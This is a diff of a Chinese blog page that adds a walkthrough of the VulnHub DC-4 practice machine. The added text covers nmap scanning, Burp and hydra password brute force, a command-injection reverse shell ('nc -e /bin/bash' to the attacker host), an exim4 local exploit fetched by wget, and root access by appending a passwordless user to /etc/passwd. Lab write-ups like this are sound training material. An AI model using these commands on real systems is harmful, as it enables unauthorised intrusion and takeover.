@@ -85,7 +85,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">64</span>
+            <span class="post-count">1.1k</span>
         </span>
     </span>
 
@@ -94,7 +94,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">4 分钟</span>
         </span>
     </span>
 </div>
@@ -109,7 +109,7 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><h4 id="1-下载地址"><a href="#1-下载地址" class="headerlink" title="1.下载地址"></a>1.下载地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-4,313/</span><br></pre></td></tr></table></figure>
+  <h3 id="一、前期准备"><a href="#一、前期准备" class="headerlink" title="一、前期准备"></a>一、前期准备</h3><h4 id="1-下载地址"><a href="#1-下载地址" class="headerlink" title="1.下载地址"></a>1.下载地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-4,313/</span><br></pre></td></tr></table></figure>
 
 
 
@@ -119,10 +119,130 @@
 <span id="more"></span>
 
 <p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230605134110517.png" alt="image-20230605134110517"></p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h4><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230605142153347.png" alt="image-20230605142153347"></p>
-<p>nmap扫描</p>
-<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230605142220231.png" alt="image-20230605142220231"></p>
-<p>nmap -sS -A -p 1-65535 192.168.</p>
+<h3 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h3><h4 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h4><p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230605142153347.png" alt="image-20230605142153347"></p>
+<p>发现靶机目标IP为192.168.1.9</p>
+<blockquote>
+<p>kali		192.168.1.49</p>
+<p>dc-4		192.168.1.9</p>
+</blockquote>
+<h4 id="2-nmap扫描"><a href="#2-nmap扫描" class="headerlink" title="2.nmap扫描"></a>2.nmap扫描</h4><p>nmap扫描同一网段下主机及其开放端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.1.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609090634584.png" alt="image-20230609090634584"></p>
+<p>nmap扫描指定靶机IP开放端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 1-65535 192.168.1.9</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609094348637.png" alt="image-20230609094348637"></p>
+<p>发现开放了两个端口，80和22端口</p>
+<h4 id="3-收集网站信息"><a href="#3-收集网站信息" class="headerlink" title="3.收集网站信息"></a>3.收集网站信息</h4><p>发现一个登录页面</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609094823307.png" alt="image-20230609094823307"></p>
+<p>根据网页信息，有admin用户</p>
+<h3 id="三、web渗透"><a href="#三、web渗透" class="headerlink" title="三、web渗透"></a>三、web渗透</h3><h4 id="1-爆破登录密码"><a href="#1-爆破登录密码" class="headerlink" title="1.爆破登录密码"></a>1.爆破登录密码</h4><p>我们利用burp抓包爆破一下密码，字典上网上搜索一个，我的是十万多个的密码字典，地址就不写了，在github中可以找到的。</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609100856139.png" alt="image-20230609100856139"></p>
+<p>密码是happy</p>
+<p>拿到密码尝试登录</p>
+<h4 id="2-测试漏洞"><a href="#2-测试漏洞" class="headerlink" title="2.测试漏洞"></a>2.测试漏洞</h4><p>登陆后</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609101102700.png" alt="image-20230609101102700"></p>
+<p>点击命令，出现如下图</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609101146677.png" alt="image-20230609101146677"></p>
+<p>好像是在执行系统命令，所以直接抓包改改数据</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609101913955.png" alt="image-20230609101913955"></p>
+<p>确认是执行linux系统命令，尝试反弹shell。</p>
+<h4 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h4><p>在kali中设置监听端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 12445</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609102510493.png" alt="image-20230609102510493"></p>
+<p>在burp中反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc+-e+/bin/bash+192.168.1.49+12445</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609102345123.png" alt="image-20230609102345123"></p>
+<p>连接成功后为了方便，我们可以进入交互式shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609103024096.png" alt="image-20230609103024096"></p>
+<h3 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h3><h4 id="1-提权方法一"><a href="#1-提权方法一" class="headerlink" title="1.提权方法一"></a>1.提权方法一</h4><h5 id="找提权方法"><a href="#找提权方法" class="headerlink" title="找提权方法"></a>找提权方法</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609104124383.png" alt="image-20230609104124383"></p>
+<p>发现一个exim4</p>
+<blockquote>
+<p>Exim是基于GPL协议的开放源代码软件，由英国剑桥大学的Philip Hazel开发，目前最新版4.24。Exim是一个MTA（Message Transfer Agent），即消息传输代理，负责邮件的路由、转发和投递。Exim被作者设计成可运行于绝大多数的类Unix系统上，包括 Solaris，AIX，Linux等。<br>　 　Exim与其它开源的MTA（QMail、Postfix）相比，最大的特点是配置极其灵活。Exim的配置文件也是一个文本文件，但它支持一种称为 String Expansion的技术。String Expansion可以理解为一种简单的脚本语言，能够执行诸如条件判断、字符串转换等功能。当然，Exim基本的功能也是非常丰富的。</p>
+</blockquote>
+<p>查看一下exim4版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exim4 --version</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609104654503.png" alt="image-20230609104654503"></p>
+<p>exim4版本为4.87</p>
+<h5 id="搜素本地漏洞库"><a href="#搜素本地漏洞库" class="headerlink" title="搜素本地漏洞库"></a>搜素本地漏洞库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim4</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609105944950.png" alt="image-20230609105944950"></p>
+<p>将46996.sh移动到桌面</p>
+<h5 id="开启文件传输"><a href="#开启文件传输" class="headerlink" title="开启文件传输"></a>开启文件传输</h5><p>在桌面开启一个传输服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 5566</span><br></pre></td></tr></table></figure>
+
+<p>在dc4靶机中获取这个文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.1.49:5566/46996.sh</span><br></pre></td></tr></table></figure>
+
+<p>下载成功，给执行权限，并且运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x 46996.sh</span><br></pre></td></tr></table></figure>
+
+<p>最终拿到root权限</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609113142110.png" alt="image-20230609113142110"></p>
+<p>但这个貌似不是本题的正解，算是非预期解吧</p>
+<h4 id="2-提权方法二"><a href="#2-提权方法二" class="headerlink" title="2.提权方法二"></a>2.提权方法二</h4><p>在靶机中翻看有什么文件</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609132357563.png" alt="image-20230609132357563"></p>
+<p>在backups目录下发现一个类似密码字典的文件，应该是让我们爆破jim</p>
+<h5 id="hydra爆破密码"><a href="#hydra爆破密码" class="headerlink" title="hydra爆破密码"></a>hydra爆破密码</h5><p>把文件内容复制，保存到kali里，保存名称为 <code>pass.txt</code> ，爆破使用hydra</p>
+<blockquote>
+<p>Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具。Hydra是一个验证性质的工具，主要目的是：<strong>展示安全研究人员从远程获取一个系统认证权限。</strong></p>
+<p>在kali中内置</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P pass.txt 192.168.1.9 ssh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609133628896.png" alt="image-20230609133628896"></p>
+<p>得到账号密码</p>
+<blockquote>
+<p>账号：jim</p>
+<p>密码：jibril04</p>
+</blockquote>
+<h5 id="ssh连接登录"><a href="#ssh连接登录" class="headerlink" title="ssh连接登录"></a>ssh连接登录</h5><p>使用kali进行ssh连接登录，输入两个yes，输入密码即可登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh @192.168.1.9</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609133854300.png" alt="image-20230609133854300"></p>
+<p>接下来开始搜索文件</p>
+<p>发现jim有一封邮件</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609134101066.png" alt="image-20230609134101066"></p>
+<p>进入邮件目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd var/spool/mail</span><br></pre></td></tr></table></figure>
+
+<p>进入后发现jim的邮件</p>
+<p>打开之后</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609134330800.png" alt="image-20230609134330800"></p>
+<p>可以看到发件人的账号和密码</p>
+<blockquote>
+<p>账号：charles</p>
+<p>密码：^xHhA&amp;hvim0y</p>
+</blockquote>
+<p>直接su xxx切换用户</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609134602360.png" alt="image-20230609134602360"></p>
+<p>发现，账号都是小写的才可以</p>
+<h5 id="teehee提权"><a href="#teehee提权" class="headerlink" title="teehee提权"></a>teehee提权</h5><p>查看使用sudo运行的命令</p>
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609134715585.png" alt="image-20230609134715585"></p>
+<p>可以使用teehee提权，那我们可以用teehee写一些信息到 <code>/etc/passwd</code> 里面</p>
+<blockquote>
+<p>&#x2F;etc&#x2F;passwd 内每个字段的含义</p>
+<p>username:password:User ID:Group ID:comment:home directory:shell</p>
+</blockquote>
+<p>用户名admin，没有密码为管理员权限，进入的时候运行&#x2F;bin&#x2F;bash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609135621833.png" alt="image-20230609135621833"></p>
+<h5 id="查找flag"><a href="#查找flag" class="headerlink" title="查找flag"></a>查找flag</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name *flag*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609135811806.png" alt="image-20230609135811806"></p>
+<p>发现flag在 <code>/root</code> 目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../images/Vulnhub%E7%B3%BB%E5%88%97-DC4%E9%9D%B6%E5%9C%BA/image-20230609140035724.png" alt="image-20230609140035724"></p>
  
       <!-- reward -->
       
